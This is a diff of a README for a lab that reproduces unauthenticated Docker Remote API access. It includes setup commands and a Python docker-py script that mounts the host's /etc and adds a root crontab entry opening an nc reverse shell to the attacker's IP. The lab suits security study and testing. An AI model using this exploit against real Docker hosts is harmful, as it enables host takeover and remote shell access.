@@ -1,25 +1,36 @@
-# Docker daemon api unauthorized access exploit
+# Docker Remote API Unauthorized Access Leads to Remote Code Execution
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
-Reference Links：
+Docker is a platform-as-a-service solution that delivers software in packages called containers. The Docker daemon (dockerd) exposes a REST API that allows remote management of Docker containers, images, and other resources.
 
-- http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8
+When the Docker daemon is configured to listen on a network port (typically TCP port 2375) without proper authentication mechanisms, attackers can gain unauthorized access to the Docker API. This vulnerability allows attackers to create, modify, and execute containers on the host system, potentially leading to remote code execution, data theft, and complete host system compromise.
 
-## Vulnerability environment
+- <https://docs.docker.com/engine/security/protect-access/>
+- <https://tttang.com/archive/357/>
 
-Enter the following command to build and run the vulnerability environment:
+## Environment Setup
+
+Execute the following command to start the vulnerable Docker environment:
 
 ```
 docker compose build
 docker compose up -d
 ```
 
-## Exploit
+After the environment is started, the Docker daemon will listen on port 2375 without any authentication requirements.
 
-Start a container, and mount the host `/etc` folder to the container, then we will have read/write access to any files.
+## Vulnerability Reproduction
 
-We can put the commands in crontab configuration file to reverse shell
+The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.
+
+First, install the required Python library:
+
+```
+pip install docker
+```
+
+Then create and run a Python script that exploits the vulnerability:
 
 ```python
 import docker
@@ -28,6 +39,10 @@ client = docker.DockerClient(base_url='http://your-ip:2375/')
 data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
 ```
 
-Reverse shell exploit by injecting commands in crontab:
+The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.
 
-![](1.png)
+The successful exploitation can be verified by receiving the reverse shell connection:
+
+![Reverse Shell Exploitation](1.png)
+
+This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
